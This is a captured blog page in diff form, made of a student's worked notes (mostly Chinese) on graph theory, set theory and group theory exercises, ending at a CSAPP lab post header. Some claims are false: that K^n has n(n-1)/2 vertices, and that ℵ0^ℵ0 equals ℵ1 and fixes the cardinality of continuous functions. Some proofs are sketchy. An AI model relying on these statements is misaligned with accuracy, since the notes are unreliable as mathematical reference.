+这也被称为图上的三角不等式，算是一个小技巧吧。同时涉及半径的问题往往要设出中心点来
+
+
+
+### $\star$设图$G$半径至多为$k$，且最大度至多为$d\ge 3$，则$G$的点数不超过$\frac{d}{d-2}{\left(d-1\right)}^k$
+
+这个构造就比较巧妙，想不到不过可以学习
+
+首先取出$G$中的中心点$x$，定义$D_0=\left\{x\right\}$，$D_n=N_G(\cup_{i=0}^{n-1}{D_i})$
+
+这样就把图$G$以$x$为中心点，按照到$x$的距离分成了若干“层”，且$|D_0|=1$，$|D_1|=d$
+
+由$\Delta(G)=d$可知，$|D_n|\le (d-1)|D_{n-1}|$，因为$D_{n-1}$中的每个点至少和$D_{n-2}$中的点有一条边，因此还剩下至多$d-1$条
+
+于是$|V(G)|=\sum\limits_{i=0}^{k}{D_i}\le 1+\sum\limits_{i=1}^k{d{\left(d-1\right)}^{i-1} }=\frac{d{\left(d-1\right)}^{k} }{d-2}$
+
+这个式子告诉我们如果$rad G$和$\delta(G)$都很大，那么这个图也会很大
+
+
+
+### 完全图$K^n$有$\frac{n(n-1)}{2}$个点
+
+这个太简单了
+
+
+
+### 若$G$中有长度为奇数的closed walk，则必存在一个长度为奇数的odd cycle
+
+不妨取出$G$中最短的、长度为奇数的closed walk，记为$W$
+
+把$W$写出来就是$W=v_0e_0v_1e_1\dots e_{t-1}v_t$
+
+1. 若$W$中任意节点都只出现了一次，则据定义可知这就是一个cycle，且长度为奇数；
+2. 否则$\exists i<j$使得$v_i=v_j$，此时$v_ie_i\dots v_j$是$W$中的一个closed walk，不妨记为$W'$。于是有$|W'|$与$|W-W'|$二者必有一个为奇数(由$|W|$为奇数立即得到)，因此存在一个更短的、长度为奇数的closed walk，矛盾
+
+这个“取最值”的证明手法会非常常见
+
+
+
+### 证明：一棵树$T$至少有$\Delta(G)$个叶子
+
+首先证明一棵树$T$在$|V(T)|\ge 2$时至少有两个叶子：
+
+	在$|V(T)|=2$和$|V(T)|=3$的时候结论是显然的；
+	
+	假设$T$没有叶子，则$\delta(G)\ge 2$，由推论可知$T$中存在长度至少为$3$的circle，矛盾；
+	
+	假设$T$恰好只有一个叶子，记为$v_l$，则图$T'=T-v_l$仍然是一棵树(保持连通性、不会引入环)，且$T'$叶子的数量$\le 1$
+	
+		假设$T'$没有叶子，则矛盾；假设$2\le |V(T)|\le 3$，则也矛盾；故$T'$必有一个叶子，重复上述操作
+	
+		由$|V(T)|$有限可知，上述过程必然会产生矛盾，故$T$至少有$2$个叶子
+
+
+
+取出$deg(v)=\Delta(T)$的点，构造$T''=T-v$，则$T''$不连通、$T''$中的每个component都是树，这样共有$\Delta(G)$棵新树，此时至少有$2\Delta(G)$个叶子
+
+注意到有恰好$\Delta(G)$个叶子是删除了$v$造成的，于是$T=T''+v$中至少有$\Delta(G)$个叶子
+
+
+
+### 证明：$G$是二分图$\iff G$中无odd cycle
+
+$\Rightarrow$是很好证明的
+
+假设二分图$G$存在长度为奇数的cycle，记为$C$，写出来就是$v_0e_0v_1\dots v_{2k}e_{2k}v_0$
+
+由$G$是二分图，则$\exists V_0,V_1\subseteq V(G)$使得$\left\{V_0,V_1\right\}$是$V(G)$的一个划分，且$\forall x,y\in V_0, xy\not\in E(G)\and \forall x,y\in V_1,xy\not \in E(G)$。
+
+我们不妨令$v_0\in V_0$，则$v_1\in V_1,v_2\in V_0,\dots,v_{2i}\in V_0,v_{2i+1}\in V_1,\dots$，则$v_{2k}\in V_0$，即$e_{2k}$的两端都在$V_0$中，矛盾；
+
+
+
+$\Leftarrow$的证明要构造一个解
+
+已知图$G$中无奇数cycle，任取$r\in V(G)$，$\forall v\in V(G)$我们规定：
+
+1. 若$dist(r,v)$是奇数，则$v\in V_1$
+2. 否则$v\in V_0$
+
+考虑一条边$e=xy$，若$x\in V_1\and y\in V_1$，那么取$x\sim r\sim yex$得到一条closed walk，且长度为奇数(奇+奇+1)，故$G$一定存在odd cycle，矛盾；
+
+同理$x\in V_0\and y\in V_0$的情况也可以得到矛盾；于是不存在$V_0$和$V_1$内部的边
+
+
+
+### 连通图$G$中含有长度至少为$\min\left\{2\delta(G),|V(G)|\right\}$的path或cycle
+
+这题有点奇妙的
+
+由反证法，不妨假设我们取出了$G$中最长的path或cycle，记为$P$。
+
+首先考虑$P$为cycle的情况：
+
+若$|P|=|G|$则这就是最长的path或cycle；否则$\exists v_0\in G\and v_0\not\in P$，由连通性可知存在$v_1$使得$v_0-v_1$是一条不在$P$上的path且$v_1\in P$，于是就可以沿着$v_0\dots v_1P$走出一条长度不变的path
+
+然后考虑$P$为path的情况：
+
+记$P=v_0\dots v_1$，于是$N_G(v_0)\subseteq P\and N_G(v_1)\subseteq P$。这个可以用反证法得到(否则会有一条更长的path)
+
+这时候就有个tricky的观察：我们取出$R_P(N_G(v_0))$，这里$R_P(S)=\left\{x|xy\in P\and y\in S\right\}$，$S\subseteq P$表示取出$S$在$P$中的前驱。
+
+于是有个claim：$R_p(S)\cap N_G(v_0)=\varnothing$。证明只需要假设它们相交，则可以将$P$连成一个长度+1的cycle，这与$P$最长矛盾；
+
+这样子我们就找到了$|P|\ge |R_P\left({N_G\left(v_0\right)}\right)|+|N_G(v_1)|+|\left\{v_1\right\}|=|N_G(v_0)|+|N_G(v_1)|+1=2\delta(G)+1$，于是由path中点数和边数的关系就可以知道$P$的长度至少为$2\delta(G)$
+
+
+
+### 证明树$T$的自同构必存在不动点/不动边
+
+对$|T|=n$作归纳
+
+当$n=1$时必存在不动点；
+
+当$n=2$时必存在不动边；
+
+设当$n<=k$时命题成立，则当$|T|=n=k+1$时，记$L=\left\{v\mid v\in V(T)\and deg(v)=1\right\}$
+
+考虑$T$的自同构$\sigma$，则必有$\sigma (L)=L$。
+
+1. 若$L$在$\sigma$下存在不动点或不动边，则$T$在$\sigma$下存在不动点或不动边，命题成立；
+2. 若$L$在$\sigma$下不存在不动点和不动边，则$T/L$非空且仍为一棵树，由归纳假设可知$T/L$存在不动点或不动边，于是命题也成立；
+
+由数学归纳法，$T$是一棵树$\Rightarrow T$的自同构存在不动点或不动边 对$\forall k\in\N^+$成立$\blacksquare$
+
+
+###  Let $W$ be a closed walk of length at least 1 that does not contain a circle. Prove that some edge of $W$ repeats immediately (one in each direction)
+
+首先$|W|=2n,\; n\in\N^+$，否则将存在一个odd cycle；
+
+由归纳法
+
+当$|W|=2$时，显然成立；
+
+不妨设当$|W|< k$时成立，下面将证明$|W|=k$时仍然成立
+
+由于$W$无环，可知$\exists v\in W\and v\neq st$使得$v$被经过了两次（否则可得$W$是一个cycle）
+
+于是取出以$v$为起点和终点的walk $W'$，由归纳假设可知$W'$满足条件，于是$W$也满足条件。
+
+
+
+
+
+
+
+### Let $v$ be a cut-vertex of a simple graph $G$. Prove that $\overline G-v$ is connected.
+
+
+
+Proof:
+
+It's easy to see that $\overline G-v=\overline{G-v}$
+
+Assume $G$ is connected. Since $v$ is a cut-vertex, $\exists \left\{\,{A,B}\,\right\}$ is a partition of $V(G-v)$ s.t $\forall x\in A\and y\in B$ we have $xy\not\in E(G)$
+
+which means $\forall x\in A\and y\in B$, $xy\in E(\overline G)$
+
+Induction on $|A\cup B|$ will easily prove $\overline{G-v}$ is connected, thus $\overline G-v$ is connected.
+
+
+
+If $G$ is not connected, assume it has $k$ components $C_1,C_2\dots C_k$, by proof above we know that $C_i$ in $\overline G-v$ is connected for all $1\leqslant i\leqslant k$
+
+$\forall 1\leqslant x<y\leqslant k$, we have $C_xC_y\not\subseteq E(G)$, thus $C_xC_y\subseteq E(\overline G-v)$
+
+Induction on $k$ will easily prove $\overline {G-v}$ is connected, thus $\overline G-v$ is connected.
+
+
+
+### Prove: $G$ is bipartite iff $\forall x\in G$, $\forall y\in N_G(x)$, $\exists z\in G$ s.t. $dis(x,z)\neq dis(y,z)$
+
+$\Rightarrow$：
+
+假设 $\exists x\in G$, $\exists y\in N_G(x)$, $\forall z\in G$ 都有 $dis(x,z)=dis(y,z)$
+
+那么取closed walk $P(x,z)P(z,y)x$，这是一个长度为奇数的 closed walk
+
+由上面的定理，必然存在一个odd cycle，这和$G$ bipartite 矛盾。故假设不成立
+
+
+
+$\Leftarrow$：
+
+假设$G$不是 bipartite，那么必然存在极小odd cycle，记为$C$
+
+任取$xy\in C$，我们 claim 对于$dis(x,z)=\frac{|C|-1}{2}$ 的 $z$ 就是使得 $dis(x,z)=dis(y,z)$ 的点, 矛盾
+
+### 证明：若 $\text{diam}(G)\geqslant 3$，那么 $\text{diam}(\bar G)\leqslant 3$
+
+不妨设 $u,v\in V(G)$ 且 $dist(u,v)\geqslant 3$，考虑所有与 $u$ 距离为 $1$ 的顶点与 $u$ 构成的集合，记为 $V_u$，同理取 $V_v$
+
+注意到 $dist(u,v)\geqslant 3$，因此 $V_u\cap V_v=\varnothing$，否则将得到 $dist(u,v)=2$，矛盾；
+
+不妨记 $V(G)-V_u-V_v=V'$，此时有 $\left\{V_u,V_v,V'\right\}$ 是 $V(G)$ 的一个划分
+
+考虑在 $\bar G$ 中这些顶点集的连边情况：
+
+1. $V_u,V'$：由 $V_u$ 的定义可知，任意 $V'$ 中的顶点都与 $u$ 不相邻，因此在 $\bar G$ 中存在 $u$ 到 $V'$ 中任意顶点的边。又因为任意 $V_u$ 中的顶点与 $u$ 距离至多为 $1$，因此 $\forall x\in V_u,\forall y\in V'$ 都有 $dist(x,y)\leqslant 2$
+2. $V_v,V'$：理由同上
+3. $V_u,V_v$：在 $\bar G$ 中 $V_u-\left\{u\right\}$ 与 $v$ 有边直接相连，同理在 $\bar G$ 中 $V_v-\left\{v\right\}$ 与 $u$ 有边直接相连（否则它们在 $G$ 中直接相连，根据 $V_u\cap V_v=\varnothing$ 可得矛盾）。并且 $u-v\in E(\bar G)$ （否则同样违背 $G$ 中两点的距离限制） 因此 $\forall x\in V_u,\forall y\in V_v$ 都有 $dist(x,y)\leqslant dist(x,v)+dist(v,u)+dist(u,y)\leqslant3$
+4. $V_u$ 内部的点对：$\forall x,y\in V_u$，都有 $dist(x,y)\leqslant dist(x,v)+dist(v,y)\leqslant 2$
+5. $V_v$ 内部的点对理由同上
+6. $V'$ 内部的点对：$\forall x,y\in V'$，都有 $dist(x,y)\leqslant dist(x,u)+dist(u,y)\leqslant 2$
+
+不难发现上述讨论列出了所有情况，因此 $\forall x,y\in V(\bar G)$ 都有 $dist(x,y)\leqslant 3$，即 $\text{diam}(\bar G)\leqslant 3$
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/04/09/%E5%9B%BE%E8%AE%BA%E4%B9%A0%E9%A2%98%E4%B9%B1%E5%81%9A/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
             </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/09/%E9%9B%86%E5%90%88%E8%AE%BA%E4%B9%A0%E9%A2%98%E4%B9%B1%E5%81%9A/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="jpwang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="jjppp">
+      <meta itemprop="description" content="Young, Simple & Naive">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | jjppp">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/04/09/%E9%9B%86%E5%90%88%E8%AE%BA%E4%B9%A0%E9%A2%98%E4%B9%B1%E5%81%9A/" class="post-title-link" itemprop="url">集合论习题乱做</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-04-09 23:00:00" itemprop="dateCreated datePublished" datetime="2021-04-09T23:00:00+08:00">2021-04-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-06-19 09:47:11" itemprop="dateModified" datetime="2022-06-19T09:47:11+08:00">2022-06-19</time>
+    </span>
+
+  
+</div>
+
         </div>
-    </body>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          
+### 给定2个集合$A$和$B$，可以任意使用$\cap$、$\cup$、$\\$，可以任意使用$A$和$B$任意多次，最多可以得到多少本质不同的集合？对于给定n个集合的情况答案又是多少？
+
+这个问题比较巧妙。2个集合的时候，我们最多可以把全集划分为4个区域，除$\overline{A\cup B}$外每个区域都可以单独地取到，并且可以相互并起来
+那么最后的答案就是$2^{4-1}=8$，
+
+推广一下，就是n个集合最多能将全集划分为$2^n$个互不相交的区域，且除了$\overline{\cup{A_i} }$外其余区域都是可以单独取到的，那么答案就是$2^{2^n-1}$
+
+
+
+### 若只能使用$\cup$、$\cap$，其余条件同1，则答案又是多少？
+
+同样我们仍然可以划分出$2^n-1$个区域，然而不同之处在于我们无法单独地取到每个最小部分。事实上这个问题等价于求一个$\left\{0,1\right\}^n\mapsto \left\{0,1\right\}$的映射$f$，且这个映射满足$\forall x,y\in\left\{0,1\right\}^n,\ \ \ \ x\le y\Leftrightarrow f(x)\le f(y)$。其中我们说$x=\left(a_1,a_2,...,a_n\right)\le y=(b_1,b_2,...,b_n)$当且仅当$\forall 1\le i\le n,\ \ \  a_i\le b_i$
+
+也就是说任意一个映射下，在$\left\{0,1\right\}^n$中必存在一个最大值（就是我们选择的一个结果），使得任意属于它的集合都被覆盖了。这个问题也叫$n$元单调boole函数计数
+
+
+
+### 证明不相交开区间的任何族要么是有限的，要么是可数的
+
+$\forall l< r,\exists q\in\mathbb Q\ \ s.t. \ \ q\in\left(l,r\right)$ 做到这一点要用到选择公理
+
+于是存在一个双射$S\mapsto \mathbb Q$，于是$\left|S\right|\le\left|\mathbb Q\right|=\aleph_0$
+
+
+
+### (a)证明平面上不相交的“8”字形至多有可数多个
+
+注意到每个"8"的两个圆圈圈住了两个有理点（这一点要用到选择公理），并且每个"8"到有理点对的映射为单射（否则存在两个不同的"8"它们相交，与题意不符），于是$|S|\le|\mathbb Q\times\mathbb Q|=\aleph_0$
+
+
+
+### (b)证明平面上不相交的"Y"字形至多有可数多个
+
+还不会，留坑。。
+
+
+
+### $\mathbb R$上的连续函数的cardinality是多少？
+
+首先可以观察到$f(x)=c$这样的常数函数是连续的，故连续函数的cardinality至少为$\aleph_1$
+
+然后由连续函数的定义可知，$\forall x\in \mathbb R$，都$\exists \left\{f(a_1),f(a_2),f(a_3),\dots\right\}$使得$f\left({\lim\limits_{n\rightarrow \infty}{a_n} }\right)=f(x)$，其中$\forall n\in \mathbb N$都有$a_n\in \mathbb Q$
+
+即我们可以用可数个有理数，通过极限运算得到任意的实数。故连续函数的cardinality至多为${\aleph_0}^{\aleph_0}=\aleph_1$
+
+
+
+### 记$[n]=\left\{\,1, 2\dots n\,\right\}$，$n\in \mathbb N$，则求$|[1]\times [2]\times [3]\dots|$
+
+考虑这么一个映射$f:\vec x\mapsto a$，其中$a$是一个二进制数，$a$的第$k_i$位为$1$，这里$k_i=\sum\limits_{j=1}^{i}\vec x[i]$
+
+容易验证这是一个单射，且把$S=[1]\times[2]\times[3]\dots$映射到$\mathbb N$，故所求基数为$\aleph_0$
+
+### 证明：自然数 $1,2,3\ldots n^2+1$ 的任意排列都存在长度至少为 $n+1$ 的严格递增或严格递减序列
+
+
+
+由反证法，假设 $1,2,3\ldots n^2+1$ 的任意排列都**不存在**长度至少为 $n+1$ 的严格递增或严格递减序列，则严格递增或严格递减数列的长度至多为 $n$。此时记 $(u_i,d_i)$ 分别表示以第 $i$ 个数为起点的**最长**严格递增/严格递减序列的长度，则根据上面的假设，$\forall 1\leqslant i\leqslant n$ 都有 $1\leqslant u_i,d_i\leqslant n$
+
+于是不相同的 $(u_i,d_i)$ 二元组至多有 $n\times n=n^2$ 个
+
+而总共有 $n^2+1$ 个两两不同的自然数，也就是有 $n^2+1$ 个位置，根据鸽笼原理其中必然有两个位置，它们对应的二元组相等
+
+即 $\exists i<j$ 使得 $a_i\neq a_j$ 且 $(u_i,d_i)=(u_j,d_j)$
+
+若 $a_i<a_j$，则我们把 $a_i$ 和以 $a_j$ 为起点的最长严格递增序列放在一起，这样就形成了一个更长的严格递增序列，这和 $u_i$  的定义矛盾；
+
+同理若 $a_i>a_j$，我们把 $a_i$ 和以 $a_j$ 为起点的最长严格递减序列放在一起，这样就形成了一个更长的严格递减序列，这和 $d_i$  的定义矛盾；
+
+因此无论如何都会产生矛盾，即假设不成立，存在长度至少为 $n+1$ 的严格递增或严格递减序列。
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/04/09/%E9%9B%86%E5%90%88%E8%AE%BA%E4%B9%A0%E9%A2%98%E4%B9%B1%E5%81%9A/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/11/%E7%BE%A4%E8%AE%BA%E4%B9%A0%E9%A2%98%E4%B9%B1%E5%81%9A/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="jpwang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="jjppp">
+      <meta itemprop="description" content="Young, Simple & Naive">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | jjppp">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/03/11/%E7%BE%A4%E8%AE%BA%E4%B9%A0%E9%A2%98%E4%B9%B1%E5%81%9A/" class="post-title-link" itemprop="url">群论习题乱做</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-03-11 23:01:00" itemprop="dateCreated datePublished" datetime="2021-03-11T23:01:00+08:00">2021-03-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-06-19 09:47:11" itemprop="dateModified" datetime="2022-06-19T09:47:11+08:00">2022-06-19</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          有一些在课上做过了就没放(而且都还是*题，拿来入门，难顶....)
+
+当然后来再补也说不定。拿不准的翻译就照抄原文。
+
+
+
+### 令$G$是$n$阶有限群，$S$是$G$的子集，且$2|S|>|G|$，试证明$\forall a\in G$都$\exists b,c\in S$使得$a=bc$
+
+这题有点巧妙。注意到$S\subseteq G$，我们构造$T=\left\{x^{-1}|x\in S\right\}$，则任意取$a\in G$，构造$aT=\left\{ax^{-1}|x\in S\right\}\subseteq G$。又因为$|aT|+|S|>|G|$且$aT\cup S\subseteq G$，所以$aT\cap S\neq \varnothing$
+
+即$\exists d\in T, b\in S$使得$ad=b$，即$a=bd^{-1}$，这里$d^{-1}\in S$
+
+
+
+### 证明：$b$是含幺半群$G$中的元$a$的逆元当且仅当$aba=a,ab^2a=1$
+
+由$aba=a$两侧同时左乘$ab^2$得到$ab^2aba=(ab^2a)ba=ba=1$
+
+由$aba=a$两侧同时右乘$b^2a$得到$abab^2a=ab^2a=ab=1$
+
+即$ab=ba=1$，$b$为$a$的逆元
+
+
+
+### 令$G$是$n$阶有限群，从中任取出$n$个元素$a_1,a_2,\dots,a_n$，不一定两两不同。证明：存在正整数$1\le p\le q\le n$使得$\prod\limits_{i=p}^{q}{a_i}=1$
+
+不妨从$G$中再任意取出一个元素$a_{0}$，构造$s_k=\prod\limits_{i=0}^{k}{a_i}$，易得$\forall 0\le k\le n$都有$s_k\in G$
+
+$|G|=n\le n+1$，则根据鸽笼原理，$s_0,s_1,\dots,s_n$这$n+1$个数中必有两个相等，不妨记作$s_u$和$s_v$，其中$0\le u< v\le n$，则$s_v{s_u}^{-1}=\prod\limits_{i=u+1}^{v}{a_i}=1$，此时的$p,q$恰好为$u+1,v$
+
+
+
+### 证明：已知$\gcd(n,m)=1$，若有限群$G$中$\exists a$使得$a^n=e$，则$\exists b\in G$使得$b^m=e$
+
+裴蜀定理：$\gcd(n,m)=1\iff sm+tn=1$有整数解
+
+那么$e=a^{sm+tn}=a^{sm}a^{tn}={\left(a^s\right)}^{m}{\left(a^n\right)}^t={\left(a^s\right)}^{m}$
+
+取$b=a^s$就好了
+
+
+
+### $\left\{A,B\right\}$是半群$S$的一个划分，且$\forall a,b,c\in A$都有$abc\in A$；$\forall a,b,c\in B$都有$abc\in B$。证明：$A,B$至少有一个是半群
+
+由反证法，不妨假设$\exists a_1,a_2\in A\and \exists b_1,b_2\in B$使得$a_1a_2\in B\and b_1b_2\in A$
+
+于是$a_1a_2b_1b_2=(a_1a_2)b_1b_2=a_1a_2(b_1b_2)$，分属于两个不交的集合，于是矛盾；
+
+
+
+### 设$A\le G,B\le G$ ，若$\exists a,b\in G$使得$Aa=Bb$，则$A=B$
+
+由$Aa=Bb\Rightarrow Aab^{-1}=B$
+
+因为$e\in B$，所以$ba^{-1}\in A$，所以${\left({ba^{-1} }\right)}^{-1}=ab^{-1}\in A$
+
+所以$Aab^{-1}=A=B$得证
+
+
+
+### $A,B\le G$，试证$AB\le G\iff AB=BA$
+
+先证明$\Leftarrow$：
+
+单位元和结合律比较显然
+
+逆元：且$x\in AB\iff \exists a\in A,b\in B$使得$x=ab$，则$x^{-1}=b^{-1}a^{-1}\in BA=AB$
+
+封闭性：若$x=ab\in AB,y=cd\in AB$，则$xy=abcd=b'a'cd=b'(a'c)d=(a'c)(b'd)\in AB$
+
+
+
+再证明$\Rightarrow$：
+
+由$AB\le G$可知，$ab\in AB\Rightarrow (ab)^{-1}\in AB$；
+
+而$(ab)^{-1}=b^{-1}a^{-1}\in BA$，这说明$\forall (ab)^{-1}\in AB$，$(ab)^{-1}\in BA$，即$AB\subseteq BA$；
+
+另一方面，$\forall ba\in BA$，$(ba)^{-1}=a^{-1}b^{-1}$，即$\forall (ba)^{-1}\in BA$，$(ba)^{-1}\in AB$，即$BA\subseteq AB$
+
+也就是说$AB=BA$
+
+
+
+### 若$A,B\le G$，$AB=G$且$A\le C\le G$，证明$C=A(B\cap C)$
+
+这个技法貌似比较有用，要多学学
+
+
+
+首先$A(B\cap C)\subseteq C$比较简单：
+
+$\forall x\in A(B\cap C)$ ，都$\exists a\in A,\exists b\in (B\cap C)$使得$x=ab$
+
+因为$b\in B$ ，所以$ab\in AB=G$；因为$b\in C$，所以$ab\in AC=C$，综合就有$ab\in (AB\cap AC)=(G\cap C)=C$，于是$A(B\cap C)\subseteq C$
+
+
+
+再证明$C\subseteq A(B\cap C)$
+
+由$G=AB$可得$\forall c\in C$都$\exists a\in A,\exists b\in B$使得$c=ab$
+
+即$b=a^{-1}c$
+
+由$b\in B$且$a^{-1}c\in C$可知$b\in (B\cap C)$，即$c=ab\in A(B\cap C)$
+
+也就证明了$C\subseteq A(B\cap C)$
+
+
+
+### 设$A,B\subseteq G$且$|A|+|B|>|G|$，求证$G=AB$
+
+类似第一题，考虑$\forall g\in G, gA^{-1}\cap B\neq \varnothing$就好了
+
+
+
+### 已知$H\le G$且$K\le G$，则$[G\colon H]$有限$\Rightarrow [G\cap K\colon H\cap K]=[K\colon H\cap K]$有限
+
+我们构造 $f:k(K\cap H)\mapsto kH$, $k\in K$，然后证明这是一个$L_{K\cap H}(K)$ 到 $L_{H}(G)$的单射
+
+先证明这是一个映射：
+
+$\forall k_1,k_2\in K$
+
+如果 $k_1(K\cap H)=k_2(K\cap H)$, 那么有 $k_1\in k_2(K\cap H)$，也就是$\exists h\in (K\cap H)$ 使得 $k_1=k_2h$
+
+又因为$h\in (K\cap H)$, $h\in H$，所以 $k_1=k_2h\in k_2H$
+
+即 $k_1(K\cap H)=k_2(K\cap H)\Rightarrow k_1H=k_2H$，说明$f$是一个映射
+
+
+
+然后证明$f$是单射：
+
+$\forall k_1,k_2\in K$, $k_1(K\cap H)\neq k_2(K\cap H)$
+
+由 $k_1(K\cap H)\neq k_2(K\cap H)$ 可知，$\exists h_1\in (K\cap H)$ 使得 $\forall h_2\in (K\cap H)$ ,  $k_1h_1\neq k_2h_2$
+
+我们猜测 对于同一个$h_1$ 有  $k_1h_1\neq k_2h_3$ 对任意的 $h_3\in H$ 成立，并由此证明 $k_1H\neq k_2H$
+
+不妨假设 $\exists h_3\in H$ 使得 $k_2h_3=k_1h_1$, 于是有 $h_3={k_2}^{-1}k_1h_1$. 观察到 ${k_2}^{-1}, k_1, h_1$ 都在 $K$中， $h_3$ 也一定在 $K$中，即$h_3\in (H\cap K)$，这和条件($\forall h_2\in (H\cap K)$都有$k_1h_1\neq k_2h_2$)矛盾；
+
+于是通过证明 $\forall k_1,k_2\in K$ ,  $k_1(K\cap H)\neq k_2(K\cap H)\Rightarrow k_1H\neq k_2H$，我们就证明了 $f$ 是一个单射，且 $|L_{K\cap H}(K)|\le |L_{H}(G)|$，也就是 $\left[G\colon H\right]\in \N^+\Rightarrow \left[K\colon K\cap H\right]\in\N^+$
+
+
+
+### 若$G$到$H$有一个同态$f$，则$\forall g\in G$有$ord(f(g))\mid ord(g)$
+
+很显然$g^{ord(g)}=1$，两边取$f$就有$f(g^{ord(g)})=f(1)={f(g)}^{ord(g)}$，也就是$ord(f(g))\mid ord(g)$
+
+
+
+### 若$(|G|,|H|)=1$，则$G$到$H$的同态只有$f:x\mapsto e$
+
+由上面可知$\forall g\in G$，$ord(f(G))\mid ord(G)\mid|G|$，又$ord(f(g))\mid |H|$，故$ord(f(g))=1$，即$f(g)=e$
+
+
+
+### if $A\subseteq G,B\subseteq G$, $|A|+|B|>|G|$, prove $G=AB$
+
+since $|A|+|B|>|G|$, we have $A\cap B\neq\varnothing$ 
+
+$\forall g\in G$, $|A^{-1}g|=|A^{-1}|=|A|$
+
+thus  $A^{-1}g\subseteq G$, $B\subseteq G$, $|A^{-1}g|+|B|>|G|$
+
+$A^{-1}g\cap B\neq\varnothing$, assume $x\in \left({A^{-1}g\cap B}\right)$, there $\exists a\in A$ and $b\in B$ s.t. $x=a^{-1}g=b$, which means $g=ab$, that is, $G\subseteq AB$
+
+
+
+apparently we have $AB\subseteq G$, thus $G=AB$
+
+
+
+### $A\leqslant G$, $B\leqslant G$, if $\exists a,b\in G$ s.t. $Aa=Bb$, then $A=B$
+
+
+
+$Aa=Bb\Rightarrow A=B\left({ba^{-1} }\right)$
+
+we claim $ba^{-1}\in B$. assume $ba^{-1}\not\in B$, then $B\left({ba^{-1} }\right)\cap B=\varnothing$, which leads to $e\not\in A$, an obvious contradiction
+
+thus $ba^{-1}\in B$, where $A=B\left({ba^{-1} }\right)=B$
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/03/11/%E7%BE%A4%E8%AE%BA%E4%B9%A0%E9%A2%98%E4%B9%B1%E5%81%9A/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/07/CSAPP%E5%AE%9E%E9%AA%8C5-cachelab/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="jpwang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="jjppp">
+      <meta itemprop="description" content="Young, Simple & Naive">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | jjppp">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/03/07/CSAPP%E5%AE%9E%E9%AA%8C5-cachelab/" class="post-title-link" itemprop="url">CSAPP实验5: cachelab</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-03-07 10:59:00" itemprop="dateCreated datePublished" datetime="2021-03-07T10:59:00+08:00">2021-03-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
